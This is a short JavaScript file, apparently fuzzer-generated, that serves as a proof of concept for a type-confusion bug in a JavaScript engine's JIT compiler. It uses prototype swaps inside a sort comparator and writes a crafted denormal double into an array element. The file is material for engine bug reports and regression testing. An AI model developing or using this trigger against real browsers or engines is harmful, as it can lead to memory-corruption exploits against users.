function opt(a1, a2) {
    a2[0];
    a1[0] = 1.1;
    a2.reverse();
    a1[0] = 2.3023e-320;
}
function main() {
    let arr = [1.1,2.2,3.3];
    arr.__proto__ = null;
    delete arr[1];
    let arr2 = [,{}];
    arr2.__proto__ = {};
    arr2.reverse = Array.prototype.reverse;
    for (let i25 = 0; i25 < 10000; i25++) {
        opt(arr, arr2);
    }
    const v32 = () => {
        const t17 = arr2.__proto__;
        t17.__proto__ = arr;
    };
    Array.prototype.sort.call(arr, v32);
    opt(arr, arr2);
    print(arr[0]);
}
main();
